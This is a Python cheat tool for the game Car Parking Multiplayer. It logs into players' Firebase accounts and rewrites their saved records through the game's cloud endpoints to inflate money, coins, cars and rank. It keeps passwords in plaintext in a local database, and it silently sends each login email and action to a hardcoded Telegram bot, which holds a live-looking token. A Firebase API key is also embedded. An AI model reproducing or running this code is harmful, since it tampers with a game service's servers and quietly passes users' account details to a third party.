#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import os
import sys
import time
import base64
import struct
import hashlib
import zlib
import sqlite3
from copy import deepcopy
from datetime import datetime

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import brotli
    HAS_BROTLI = True
except ImportError:
    HAS_BROTLI = False

# ─── CONFIG ───────────────────────────────────
BOT_TOKEN = "8663420665:AAENhWlvRPuv_bjHEVE3tqseeWqgGOJLFB0"
CHAT_ID = "8884756222"

FK = "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA"
LOAD_URL = "https://europe-west1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords3"
SAVE_URL = "https://europe-west1-cp-multiplayer.cloudfunctions.net/SavePlayerRecordsPartially8"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"

MAX_MONEY = 50_000_000
MAX_COIN = 500_000

G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[97m"
R = "\033[91m"
RE = "\033[0m"

# ─── TELEGRAM LOG ─────────────────────────────

def send_telegram(msg):
    if not BOT_TOKEN or not CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": msg}, timeout=10)
    except:
        pass

# ─── CRYPTO HELPERS ───────────────────────────

def make_xor_key(uid):
    chars = list(uid)
    if len(chars) >= 9: chars[1], chars[8] = chars[8], chars[1]
    if len(chars) >= 3: chars.pop(2)
    if len(chars) >= 5: chars.append(chars[4])
    return "".join(chars).encode("utf-8")

def xor_bytes(data, key):
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def decompress(data):
    if HAS_BROTLI:
        try: return brotli.decompress(data)
        except: pass
    try: return zlib.decompress(data, zlib.MAX_WBITS | 16)
    except: pass
    try: return zlib.decompress(data)
    except: pass
    return None

def decrypt_aes(data, key):
    if not HAS_CRYPTO: return None
    try:
        cipher = AES.new(key[:16], AES.MODE_CBC, b"\x00" * 16)
        return unpad(cipher.decrypt(data), 16)
    except: return None

def _md5(t): return hashlib.md5(t.encode()).digest()
def _sha1(t): return hashlib.sha1(t.encode()).digest()[:16]

def build_aes_keys(uid, password=None, email=None):
    keys = [_md5("olzhas_carparking")]
    if password: keys += [_md5(password), _sha1(password)]
    if uid: keys += [_md5(uid), _sha1(uid)]
    if email: keys.append(_md5(email))
    return keys

# ─── READER ───────────────────────────────────

class Reader:
    def __init__(self, data):
        self.buf = data; self.pos = 0

    def has_bytes(self, n): return self.pos + n <= len(self.buf)
    def read_byte(self):
        if not self.has_bytes(1): return 0
        v = self.buf[self.pos]; self.pos += 1; return v
    def read_int(self):
        if not self.has_bytes(4): self.pos = len(self.buf); return 0
        v = struct.unpack_from("<i", self.buf, self.pos)[0]; self.pos += 4; return v
    def read_float(self):
        if not self.has_bytes(4): self.pos = len(self.buf); return 0.0
        v = struct.unpack_from("<f", self.buf, self.pos)[0]; self.pos += 4; return v
    def read_string(self):
        marker = self.read_int()
        if marker in (0, -1): return ""
        length = (-marker) - 1 if marker < -1 else marker
        if marker < -1: self.read_int()
        if length > 1_000_000: length = 1_000_000
        if not self.has_bytes(length): return ""
        text = self.buf[self.pos:self.pos + length].decode("utf-8", errors="replace")
        self.pos += length
        return text.replace("\x00", "").strip()
    def read_list(self, item_fn):
        count = self.read_int()
        if count <= 0 or count > 1_000_000: return []
        return [item_fn() for _ in range(count) if self.pos < len(self.buf)]
    def read_dict(self):
        count = self.read_int()
        if count <= 0 or count > 1_000_000: return {}
        return {self.read_int(): self.read_int() for _ in range(count) if self.pos < len(self.buf)}
    def read_equipment(self):
        if self.read_byte() == 0: return None
        return {
            "hair": self.read_list(self.read_int), "face": self.read_list(self.read_int),
            "beard": self.read_list(self.read_int), "cap": self.read_list(self.read_int),
            "mask": self.read_list(self.read_int), "top": self.read_list(self.read_int),
            "gloves": self.read_list(self.read_int), "bag": self.read_list(self.read_int),
            "pants": self.read_list(self.read_int), "shoes": self.read_list(self.read_int),
            "glasses": self.read_list(self.read_int), "SelectedEquipments": self.read_list(self.read_int),
            "Gender": self.read_int(),
        }

def parse_player(buf):
    r = Reader(buf)
    if r.read_byte() == 0: return None
    p = {}
    p["Name"] = r.read_string(); p["money"] = r.read_int()
    p["coin"] = r.read_int(); p["localID"] = r.read_string()
    p["boughtFsos"] = r.read_list(r.read_int)

    def read_friend():
        r.read_byte()
        return {"id": r.read_string(), "Name": r.read_string(), "accountID": r.read_string()}
    p["FriendsID"] = r.read_list(read_friend)
    p["LevelsDoneTime"] = r.read_list(r.read_float)
    p["floats"] = r.read_list(r.read_float)
    p["integers"] = r.read_list(r.read_int)
    p["fcar"] = r.read_list(r.read_int)
    p["favouriteWheels"] = r.read_list(r.read_int)
    p["favouriteVinyls"] = r.read_list(r.read_int)
    p["favouriteEmojis"] = r.read_list(r.read_int)
    p["personEquipmentsMale"] = r.read_equipment()
    p["personEquipmentsFemale"] = r.read_equipment()

    if r.read_byte() == 0:
        p["platesData"] = None
    else:
        def read_vinyl():
            r.read_byte()
            def rv(): return {"x": r.read_float(), "y": r.read_float(), "z": r.read_float()}
            return {"vectors": r.read_list(rv), "v": r.read_list(r.read_string),
                    "floats": r.read_list(r.read_float), "text": r.read_string()}
        def read_plate():
            r.read_byte()
            return {"plateId": r.read_int(), "frontCarId": r.read_int(),
                    "rearCarId": r.read_int(), "vinyls": r.read_list(read_vinyl)}
        p["platesData"] = {"allPlates": r.read_list(read_plate)}

    if r.read_byte() == 0:
        p["carIDnStatus"] = None
    else:
        p["carIDnStatus"] = {
            "carGeneratedIDs": r.read_list(r.read_string),
            "carStatus": r.read_list(r.read_int),
        }

    p["allData"] = r.read_string()
    p["flags"] = r.read_dict()
    p["animations"] = r.read_list(r.read_int)
    p["emojiPacks"] = r.read_list(r.read_int)
    p["wheels"] = r.read_list(r.read_int)
    p["boughtPoliceLights"] = r.read_list(r.read_int)
    p["boughtPoliceSirens"] = r.read_list(r.read_int)
    return p

def try_parse(buf):
    candidates = [buf]
    d1 = decompress(buf)
    if d1:
        candidates.append(d1)
        d2 = decompress(d1)
        if d2: candidates.append(d2)
    for c in candidates:
        if not c: continue
        if len(c) > 0 and c[0] in (17, 23, 24):
            try:
                p = parse_player(c)
                if p and p.get("Name") is not None: return p
            except: pass
        try:
            clean = c[3:] if (len(c) >= 3 and c[0] == 0xef and c[1] == 0xbb) else c
            if clean[0] == 123: return json.loads(clean.decode("utf-8"))
        except: pass
    return None

def decrypt_player_record(base64_text, uid, password=None, email=None):
    try: buf = base64.b64decode(base64_text)
    except: return {"success": False, "message": "Bad base64"}
    if len(buf) < 10: return {"success": False, "message": "Too small"}

    direct = try_parse(buf)
    if direct: return {"success": True, "record": direct}

    if uid:
        try:
            xp = xor_bytes(buf, make_xor_key(uid))
            d = decompress(xp)
            if d:
                p = try_parse(d)
                if p: return {"success": True, "record": p}
        except: pass

    for key in build_aes_keys(uid or "", password, email):
        plain = decrypt_aes(buf, key)
        if not plain: continue
        p = try_parse(plain)
        if p: return {"success": True, "record": p}

    return {"success": False, "message": "Could not decrypt"}

# ─── WRITER ───────────────────────────────────

class Writer:
    def __init__(self): self._p = []
    def write_byte(self, v): self._p.append(bytes([v & 0xFF]))
    def write_int(self, v): self._p.append(struct.pack("<i", int(v or 0)))
    def write_float(self, v): self._p.append(struct.pack("<f", float(v or 0.0)))
    def write_string(self, s):
        if s is None: self._p.append(struct.pack("<i", -1)); return
        s = str(s)
        if s == "": self._p.append(struct.pack("<i", 0)); return
        enc = s.encode("utf-8")
        self._p.append(struct.pack("<ii", -(len(enc)) - 1, len(s)) + enc)
    def write_list(self, lst, fn):
        if lst is None: self._p.append(struct.pack("<i", -1)); return
        self._p.append(struct.pack("<i", len(lst)))
        for item in lst: fn(item)
    def write_equipment(self, data):
        if not data: self.write_byte(0); return
        self.write_byte(13)
        for k in ["hair","face","beard","cap","mask","top","gloves","bag","pants","shoes","glasses","SelectedEquipments"]:
            self.write_list(data.get(k, []), self.write_int)
        self.write_int(data.get("Gender", 0))
    def write_plates(self, data):
        if not data: self.write_byte(0); return
        self.write_byte(1)
        plates = data.get("allPlates", [])
        self._p.append(struct.pack("<i", len(plates)))
        for plate in plates:
            self.write_byte(4)
            self.write_int(plate.get("plateId", 0))
            self.write_int(plate.get("frontCarId", 0))
            self.write_int(plate.get("rearCarId", 0))
            vinyls = plate.get("vinyls", [])
            self._p.append(struct.pack("<i", len(vinyls)))
            for vinyl in vinyls:
                self.write_byte(4)
                vecs = vinyl.get("vectors", [])
                self._p.append(struct.pack("<i", len(vecs)))
                for vec in vecs:
                    self._p.append(struct.pack("<fff", vec.get("x",0), vec.get("y",0), vec.get("z",0)))
                self.write_list(vinyl.get("v", []), self.write_string)
                self.write_list(vinyl.get("floats", []), self.write_float)
                self.write_string(vinyl.get("text", ""))
    def write_car_id_status(self, data):
        if not data: self.write_byte(0); return
        self.write_byte(2)
        self.write_list(data.get("carGeneratedIDs", []), self.write_string)
        self.write_list(data.get("carStatus", []), self.write_int)
    def to_bytes(self): return b"".join(self._p)

FIELD_MAPPING = [
    (1,"localID"),(2,"money"),(3,"Name"),(4,"coin"),(5,"allData"),
    (6,"boughtFsos"),(7,"boughtPoliceLights"),(8,"boughtPoliceSirens"),
    (9,"FriendsID"),(10,"LevelsDoneTime"),(11,"floats"),(12,"integers"),
    (13,"fcar"),(14,"favouriteWheels"),(15,"favouriteVinyls"),
    (16,"favouriteEmojis"),(18,"emojiPacks"),
    (41,"personEquipmentsMale"),(42,"personEquipmentsFemale"),
    (43,"platesData"),(44,"carIDnStatus"),(45,"flags"),
    (46,"animations"),(48,"wheels"),
]
INT_LIST_FIELDS = {6,7,8,12,13,14,15,16,18,46,48}
FLOAT_LIST_FIELDS = {10,11}
ALWAYS_SEND = {"allData"}

def _field_modified(nv, ov):
    if nv is None and ov is None: return False
    if nv is None or ov is None: return True
    if type(nv) != type(ov): return True
    if isinstance(nv, (dict,list)):
        return json.dumps(nv,sort_keys=True) != json.dumps(ov,sort_keys=True)
    return nv != ov

def serialize_field(fid, value):
    w = Writer()
    if fid in (1,3,5): w.write_string(value); return w.to_bytes()
    if fid in (2,4): w.write_int(value or 0); return w.to_bytes()
    if fid == 9:
        friends = value or []
        w._p.append(struct.pack("<i", len(friends)))
        for f in friends:
            w.write_byte(3)
            w.write_string((f or {}).get("id",""))
            w.write_string((f or {}).get("Name",""))
            w.write_string((f or {}).get("accountID",""))
        return w.to_bytes()
    if fid in INT_LIST_FIELDS: w.write_list(value or [], w.write_int); return w.to_bytes()
    if fid in FLOAT_LIST_FIELDS: w.write_list(value or [], w.write_float); return w.to_bytes()
    if fid in (41,42): w.write_equipment(value); return w.to_bytes()
    if fid == 43: w.write_plates(value); return w.to_bytes()
    if fid == 44: w.write_car_id_status(value); return w.to_bytes()
    if fid == 45:
        flags = value or {}
        w._p.append(struct.pack("<i", len(flags)))
        for k, v in flags.items():
            w.write_int(int(k)); w.write_int(int(v))
        return w.to_bytes()
    return None

def build_payload(record, uid, original=None):
    fields = []
    for fid, key in FIELD_MAPPING:
        value = record.get(key)
        if value is None: continue
        if key in ALWAYS_SEND:
            should = isinstance(value, str) and len(value) > 0
        elif original is not None:
            should = _field_modified(value, original.get(key))
        else:
            should = True
        if not should: continue
        raw = serialize_field(fid, value)
        if raw is not None: fields.append((fid, raw))

    parts = [struct.pack("<i", len(fields))]
    for fid, raw in fields:
        parts.append(struct.pack("<hi", fid, len(raw)))
        parts.append(raw)
    combined = b"".join(parts)
    compressed = brotli.compress(combined) if HAS_BROTLI else zlib.compress(combined)
    encrypted = xor_bytes(compressed, make_xor_key(uid))
    return base64.b64encode(encrypted).decode("ascii")

# ─── CPM NUKER (SYNC) ─────────────────────────

GAME_HEADERS = {
    "Accept": "*/*", "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
    "X-Unity-Version": "2022.3.62f2",
}

class CPMNuker:
    def __init__(self):
        self.db_path = "cpm_tokens.db"
        self.cache = {}
        self._init_db()

    def _init_db(self):
        with sqlite3.connect(self.db_path) as c:
            c.execute("""CREATE TABLE IF NOT EXISTS tokens (
                user_id INTEGER PRIMARY KEY, auth_token TEXT, email TEXT,
                password TEXT, refresh_token TEXT, firebase_uid TEXT,
                token_expires_at REAL)""")
            c.execute("""CREATE TABLE IF NOT EXISTS user_data (
                cache_key TEXT PRIMARY KEY, email TEXT, data_json TEXT)""")
            try: c.execute("ALTER TABLE tokens ADD COLUMN firebase_uid TEXT")
            except: pass
            c.commit()

    def _ck(self, uid, email=None):
        if email: return f"{uid}_{email}"
        td = self.get_token_data(uid)
        return f"{uid}_{td['email']}" if td and td.get("email") else str(uid)

    def save_token(self, uid, auth, email, pw=None, rt=None, fuid=None):
        with sqlite3.connect(self.db_path) as c:
            c.execute("""INSERT OR REPLACE INTO tokens
                (user_id,auth_token,email,password,refresh_token,firebase_uid,token_expires_at)
                VALUES (?,?,?,?,?,?,?)""",
                (uid, auth, email, pw, rt, fuid, time.time()+3600))
            c.commit()

    def get_token_data(self, uid):
        with sqlite3.connect(self.db_path) as c:
            row = c.execute("""SELECT auth_token,email,password,refresh_token,
                firebase_uid,token_expires_at FROM tokens WHERE user_id=?""", (uid,)).fetchone()
        if row:
            return {"auth_token":row[0],"email":row[1],"password":row[2],
                    "refresh_token":row[3],"firebase_uid":row[4],"token_expires_at":row[5]}
        return None

    def get_record(self, uid, email=None):
        ck = self._ck(uid, email)
        if ck not in self.cache:
            with sqlite3.connect(self.db_path) as c:
                row = c.execute("SELECT data_json FROM user_data WHERE cache_key=?",(ck,)).fetchone()
            if row:
                try: self.cache[ck] = json.loads(row[0])
                except: pass
        return self.cache.get(ck, {})

    def set_record(self, uid, data, email=None):
        ck = self._ck(uid, email)
        self.cache[ck] = data
        with sqlite3.connect(self.db_path) as c:
            c.execute("INSERT OR REPLACE INTO user_data (cache_key,email,data_json) VALUES (?,?,?)",
                      (ck, email, json.dumps(data))); c.commit()

    def _post(self, url, payload, headers):
        try:
            h = {k:v for k,v in headers.items() if k.lower() != "host"}
            r = requests.post(url, json=payload, headers=h, timeout=30)
            try: return r.json()
            except: return {"raw": r.text, "status": r.status_code}
        except Exception as e:
            return None

    def login(self, email, password):
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={FK}"
        h = {"Accept":"*/*","Accept-Encoding":"gzip","Content-Type":"application/json",
             "User-Agent":"UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
             "X-Unity-Version":"2022.3.62f2"}
        p = {"email":email,"password":password,"returnSecureToken":True,"clientType":"CLIENT_TYPE_ANDROID"}
        try:
            r = requests.post(url, json=p, headers=h, timeout=30)
            data = r.json()
        except Exception as e:
            return {"ok":False,"message":"NETWORK_ERROR"}

        if "idToken" in data:
            return {"ok":True,"auth":data["idToken"],"refresh_token":data.get("refreshToken",""),"firebase_uid":data.get("localId","")}
        err = str(data.get("error",{}).get("message","")).upper()
        for k in ["EMAIL_NOT_FOUND","INVALID_PASSWORD","INVALID_LOGIN_CREDENTIALS","TOO_MANY_ATTEMPTS","USER_DISABLED","INVALID_EMAIL"]:
            if k in err: return {"ok":False,"message":k}
        return {"ok":False,"message":f"LOGIN_FAILED: {err[:60]}"}

    def get_auth(self, uid):
        td = self.get_token_data(uid)
        if not td: return False,"NO_TOKEN",""
        if td.get("token_expires_at",0) < time.time():
            return False,"TOKEN_EXPIRED",""
        return True,"OK",td["auth_token"]

    def load(self, uid, force=False):
        td = self.get_token_data(uid)
        if not td: return False
        ck = self._ck(uid)
        if not force and ck in self.cache: return True
        ok,msg,auth = self.get_auth(uid)
        if not ok: return False
        try:
            r = self._post(LOAD_URL,{"data":None},{**GAME_HEADERS,"Authorization":f"Bearer {auth}"})
            if not r or not r.get("result"): return False
            dec = decrypt_player_record(r["result"],td.get("firebase_uid",""),td.get("password",""),td.get("email",""))
            if dec.get("success") and dec.get("record"):
                self.set_record(uid,dec["record"],td.get("email",""))
                return True
            return False
        except Exception as e:
            return False

    def _ok(self, v):
        if v in (1,True): return True
        if v in (0,False): return False
        if isinstance(v,str):
            t=v.strip()
            if t=="1": return True
            if t=="0": return False
            try: return self._ok(json.loads(t))
            except: return False
        if isinstance(v,dict):
            for k in ("result","ok","success"):
                if k in v: return self._ok(v[k])
        return False

    def _send(self, auth, record, fuid, original=None):
        if not fuid: return False,"NO_UID"
        try:
            payload = build_payload(record, fuid, original)
            r = self._post(SAVE_URL,
                {"data":{"data":payload,"deviceId":fuid[:8]}},
                {**GAME_HEADERS,"Authorization":f"Bearer {auth}","Connection":"Keep-Alive",
                 "User-Agent":"Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SD1A.210817.036)"})
            if r and self._ok(r): return True,"OK"
            return False,f"SAVE_FAILED: {str(r)[:100]}"
        except Exception as e: return False,str(e)

    def _save(self, uid, data):
        ok,msg,auth = self.get_auth(uid)
        if not ok: return {"ok":False,"message":msg}
        td = self.get_token_data(uid)
        fuid = td.get("firebase_uid","") if td else ""
        email = td.get("email","") if td else ""
        orig = self.get_record(uid,email) or None
        ok2,msg2 = self._send(auth,data,fuid,orig)
        if ok2:
            self.set_record(uid,data,email)
            return {"ok":True}
        return {"ok":False,"message":msg2}

    def _modify(self, uid, mods):
        self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        d = deepcopy(self.get_record(uid,email))
        if not d or not d.get("Name"):
            return {"ok":False,"message":"Could not load account data. Try Refresh first."}
        for k,v in mods.items():
            if k=="money": v=min(v,MAX_MONEY)
            if k=="coin": v=min(v,MAX_COIN)
            d[k]=v
        return self._save(uid,d)

    def _set_floats(self, uid, indices_values):
        self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        d = deepcopy(self.get_record(uid,email))
        if not d or not d.get("Name"):
            return {"ok":False,"message":"Could not load account data."}
        fl = d.get("floats",[])
        max_idx = max(idx for idx,_ in indices_values)
        while len(fl) <= max_idx: fl.append(0.0)
        for idx,val in indices_values: fl[idx]=float(val)
        d["floats"]=fl
        return self._save(uid,d)

    def _set_integers(self, uid, indices_values):
        self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        d = deepcopy(self.get_record(uid,email))
        if not d or not d.get("Name"):
            return {"ok":False,"message":"Could not load account data."}
        it = d.get("integers",[])
        max_idx = max(idx for idx,_ in indices_values)
        while len(it) <= max_idx: it.append(0)
        for idx,val in indices_values: it[idx]=int(val)
        d["integers"]=it
        return self._save(uid,d)

    # ── Game operations ──
    def set_money(self, uid, amount): return self._modify(uid, {"money": min(amount, MAX_MONEY)})
    def set_coin(self, uid, amount): return self._modify(uid, {"coin": min(amount, MAX_COIN)})
    def set_player_name(self, uid, name): return self._modify(uid, {"Name": name})
    def set_player_id(self, uid, pid): return self._modify(uid, {"localID": pid.upper()})
    def set_race_wins(self, uid, amount): return self._set_floats(uid, [(8, float(amount))])
    def set_race_loses(self, uid, amount): return self._set_floats(uid, [(9, float(amount))])
    def unlock_w16(self, uid): return self._set_floats(uid, [(32, 1.0)])
    def unlock_horns(self, uid): return self._set_floats(uid, [(27,1.0),(28,1.0),(29,1.0),(30,1.0),(31,1.0)])
    def disable_damage(self, uid): return self._set_floats(uid, [(34, 1.0)])
    def unlimited_fuel(self, uid): return self._set_floats(uid, [(3, 1.0)])
    def unlock_smoke(self, uid): return self._set_floats(uid, [(33, 1.0)])

    def unlock_animations(self, uid):
        self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        d = deepcopy(self.get_record(uid,email))
        if not d or not d.get("Name"): return {"ok":False,"message":"Could not load account data."}
        d["animations"] = list(set(d.get("animations",[]) + list(range(301))))
        return self._save(uid,d)

    def unlock_wheels(self, uid):
        self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        d = deepcopy(self.get_record(uid,email))
        if not d or not d.get("Name"): return {"ok":False,"message":"Could not load account data."}
        d["wheels"] = list(set(d.get("wheels",[]) + list(range(73,221))))
        it = d.get("integers",[])
        while len(it) < 113: it.append(0)
        for i in [0,1,2,3,4,5,110,111,112]: it[i]=1
        d["integers"]=it
        return self._save(uid,d)

    def unlock_houses(self, uid):
        return self._set_integers(uid, [(8,1),(110,1),(111,1),(112,1)])

    def complete_all_levels(self, uid):
        lvl = [0] + [120 if i==43 else 1 for i in range(1,110)]
        return self._modify(uid, {"LevelsDoneTime": lvl})

    def unlock_all_cars(self, uid):
        # Postavlja boughtFsos i fcar na prvih 300 auta
        return self._modify(uid, {"boughtFsos": list(range(1, 301)), "fcar": list(range(1, 301))})

    def set_rank(self, uid):
        self.load(uid)
        ok,msg,auth = self.get_auth(uid)
        if not ok: return {"ok":False,"message":msg}
        rd = {"RatingData":{"time":1e22,"cars":1e16,"car_fix":1e13,"car_collided":1e12,
            "car_exchange":1e13,"car_trade":1e13,"car_wash":1e13,"slicer_cut":1e13,
            "drift_max":1e14,"drift":1e14,"cargo":1e5,"delivery":1e5,"race_win":3e20,
            "taxi":1e10,"levels":10000990000,"gifts":1e9,"fuel":1e10,"offroad":1e10,
            "speed_banner":1e9,"reactions":1e17,"run":1e9,"real_estate":1e9,
            "t_distance":1e10,"treasure":1e10,"block_post":1e10,"push_ups":1e12,
            "burnt_tire":1e10,"passanger_distance":1e8}}
        r = self._post(RANK_URL,{"data":json.dumps(rd)},{**GAME_HEADERS,"Authorization":f"Bearer {auth}"})
        if r and self._ok(r): return {"ok":True}
        return {"ok":False,"message":"RANK_FAILED"}

    def fix_account(self, uid):
        self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        d = deepcopy(self.get_record(uid,email))
        if not d or not d.get("Name"): return {"ok":False,"message":"Could not load account data."}
        bugs=0
        fl = (d.get("floats",[]))[:54]
        while len(fl)<54: fl.append(0.0)
        fixed_fl=[]
        for v in fl:
            if v in (1,1.0): fixed_fl.append(1.0)
            elif isinstance(v,(int,float)) and v>1: bugs+=1; fixed_fl.append(0.0)
            else: fixed_fl.append(float(v) if v else 0.0)
        it = (d.get("integers",[]))[:120]
        while len(it)<120: it.append(0)
        fixed_it=[]
        for v in it:
            if v==1: fixed_it.append(1)
            elif isinstance(v,(int,float)) and v>1: bugs+=1; fixed_it.append(0)
            else: fixed_it.append(int(v) if v else 0)
        d["floats"]=fixed_fl; d["integers"]=fixed_it
        result = self._save(uid,d)
        return {"ok":True,"bugs_fixed":bugs} if result.get("ok") else {"ok":False,"message":"FIX_FAILED"}

nuker = CPMNuker()

# ─── UI ───────────────────────────────────────

def banner():
    os.system("clear")
    print(f"{G}##############################################")
    print(f"#                                            #")
    print(f"#        {W}CAR PARKING MULTIPLAYER             {G}#")
    print(f"#           {Y}KING RANK SERVICE                {G}#")
    print(f"#                                            #")
    print(f"#        {C}IG: ilija.jvcc                     {G}#")
    print(f"#        {C}Telegram: @ILIJASELL               {G}#")
    print(f"#                                            #")
    print(f"##############################################{RE}")
    print()

def show_menu():
    print(f"{W}--- CPM TOOL MENU ---{RE}")
    print("1.  Sign In / Refresh")
    print("2.  Set Money")
    print("3.  Set Coins")
    print("4.  Unlock W16 Engine")
    print("5.  Unlock Horns")
    print("6.  No Damage")
    print("7.  Unlimited Fuel")
    print("8.  Unlock Smoke")
    print("9.  Unlock Animations")
    print("10. Unlock Wheels")
    print("11. Unlock Houses")
    print("12. Complete All Levels")
    print("13. Unlock All Cars")
    print("14. Set Race Wins")
    print("15. Set Race Loses")
    print("16. Change Name")
    print("17. Change Player ID")
    print("18. Max Rank")
    print("19. Fix Account Bugs")
    print("20. Account Info")
    print("21. Sign Out")
    print("0.  Exit")
    print()

def ensure_login(uid):
    td = nuker.get_token_data(uid)
    if not td:
        print(f"\n{Y}[*] Please sign in first (Option 1){RE}")
        return False
    return True

def do_action(uid, name, fn, *args):
    print(f"\n{Y}[*] {name}...{RE}")
    r = fn(uid, *args)
    if r.get("ok"):
        print(f"{G}[+] {name} → OK{RE}")
        if "bugs_fixed" in r:
            print(f"{G}    Bugs fixed: {r['bugs_fixed']}{RE}")
        send_telegram(f"✅ {name} applied to user {uid}")
        return True
    else:
        print(f"{R}[-] {name} → FAILED{RE}")
        print(f"{R}    {r.get('message','')}{RE}")
        return False

# ─── MAIN ─────────────────────────────────────

def main():
    uid = 8884756222  # tvoj ID kao default user (menjaj ako treba)
    
    while True:
        banner()
        td = nuker.get_token_data(uid)
        if td:
            email = td.get("email","")
            rec = nuker.get_record(uid, email)
            if rec and rec.get("Name"):
                print(f"{C}Logged in: {rec.get('Name')} | ${rec.get('money',0):,} | {rec.get('coin',0):,} coins{RE}\n")
            else:
                print(f"{C}Logged in: {email}{RE}\n")
        else:
            print(f"{Y}Not logged in{RE}\n")
        
        show_menu()
        choice = input(f"{W}Select: {RE}").strip()

        if choice == "1":
            email = input("Email: ").strip()
            pw = input("Password: ").strip()
            print(f"\n{Y}[*] Signing in...{RE}")
            r = nuker.login(email, pw)
            if r.get("ok"):
                nuker.save_token(uid, r["auth"], email, pw, r.get("refresh_token",""), r.get("firebase_uid",""))
                print(f"{G}[+] Login successful!{RE}")
                print(f"{Y}[*] Loading account data...{RE}")
                if nuker.load(uid, force=True):
                    rec = nuker.get_record(uid, email)
                    print(f"{G}[+] Loaded: {rec.get('Name')} | ${rec.get('money',0):,}{RE}")
                else:
                    print(f"{Y}[!] Could not load data, but login is saved.{RE}")
                send_telegram(f"🔐 Login: {email}")
            else:
                print(f"{R}[-] {r.get('message','Login failed')}{RE}")

        elif choice == "2":
            if not ensure_login(uid): continue
            try: amt = int(input("Amount (max 50M): ").strip().replace(",",""))
            except: print(f"{R}Invalid number{RE}"); continue
            do_action(uid, "Set Money", nuker.set_money, amt)

        elif choice == "3":
            if not ensure_login(uid): continue
            try: amt = int(input("Amount (max 500K): ").strip().replace(",",""))
            except: print(f"{R}Invalid number{RE}"); continue
            do_action(uid, "Set Coins", nuker.set_coin, amt)

        elif choice == "4":
            if not ensure_login(uid): continue
            do_action(uid, "Unlock W16", nuker.unlock_w16)

        elif choice == "5":
            if not ensure_login(uid): continue
            do_action(uid, "Unlock Horns", nuker.unlock_horns)

        elif choice == "6":
            if not ensure_login(uid): continue
            do_action(uid, "No Damage", nuker.disable_damage)

        elif choice == "7":
            if not ensure_login(uid): continue
            do_action(uid, "Unlimited Fuel", nuker.unlimited_fuel)

        elif choice == "8":
            if not ensure_login(uid): continue
            do_action(uid, "Unlock Smoke", nuker.unlock_smoke)

        elif choice == "9":
            if not ensure_login(uid): continue
            do_action(uid, "Unlock Animations", nuker.unlock_animations)

        elif choice == "10":
            if not ensure_login(uid): continue
            do_action(uid, "Unlock Wheels", nuker.unlock_wheels)

        elif choice == "11":
            if not ensure_login(uid): continue
            do_action(uid, "Unlock Houses", nuker.unlock_houses)

        elif choice == "12":
            if not ensure_login(uid): continue
            do_action(uid, "Complete All Levels", nuker.complete_all_levels)

        elif choice == "13":
            if not ensure_login(uid): continue
            do_action(uid, "Unlock All Cars", nuker.unlock_all_cars)

        elif choice == "14":
            if not ensure_login(uid): continue
            try: amt = int(input("Wins: ").strip())
            except: print(f"{R}Invalid number{RE}"); continue
            do_action(uid, "Set Wins", nuker.set_race_wins, amt)

        elif choice == "15":
            if not ensure_login(uid): continue
            try: amt = int(input("Loses: ").strip())
            except: print(f"{R}Invalid number{RE}"); continue
            do_action(uid, "Set Loses", nuker.set_race_loses, amt)

        elif choice == "16":
            if not ensure_login(uid): continue
            name = input("New name: ").strip()
            do_action(uid, "Change Name", nuker.set_player_name, name)

        elif choice == "17":
            if not ensure_login(uid): continue
            pid = input("New Player ID: ").strip().upper()
            do_action(uid, "Change ID", nuker.set_player_id, pid)

        elif choice == "18":
            if not ensure_login(uid): continue
            do_action(uid, "Max Rank", nuker.set_rank)

        elif choice == "19":
            if not ensure_login(uid): continue
            do_action(uid, "Fix Account", nuker.fix_account)

        elif choice == "20":
            if not ensure_login(uid): continue
            nuker.load(uid)
            td = nuker.get_token_data(uid)
            rec = nuker.get_record(uid, td.get("email") if td else None)
            if rec:
                print(f"\n{G}--- ACCOUNT INFO ---{RE}")
                print(f"Name:     {rec.get('Name')}")
                print(f"ID:       {rec.get('localID')}")
                print(f"Money:    ${rec.get('money',0):,}")
                print(f"Coins:    {rec.get('coin',0):,}")
                print(f"Wins:     {int(rec.get('floats',[0]*9)[8])}")
                print(f"Loses:    {int(rec.get('floats',[0]*10)[9])}")
                print(f"Cars:     {len(rec.get('boughtFsos',[]))}")
                print(f"Wheels:   {len(rec.get('wheels',[]))}")
                print(f"Anims:    {len(rec.get('animations',[]))}")
                print(f"Levels:   {sum(1 for x in rec.get('LevelsDoneTime',[]) if x and x>0)}")
            else:
                print(f"{R}Could not load data{RE}")

        elif choice == "21":
            print(f"\n{Y}[*] Signing out...{RE}")
            nuker.__init__()  # reset
            try:
                os.remove("cpm_tokens.db")
                print(f"{G}[+] Signed out and cleared data{RE}")
            except:
                print(f"{G}[+] Signed out{RE}")

        elif choice == "0":
            print(f"{Y}Exiting...{RE}")
            break

        else:
            print(f"{R}Invalid option!{RE}")

        input(f"\n{C}Press Enter to continue...{RE}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}Interrupted.{RE}")
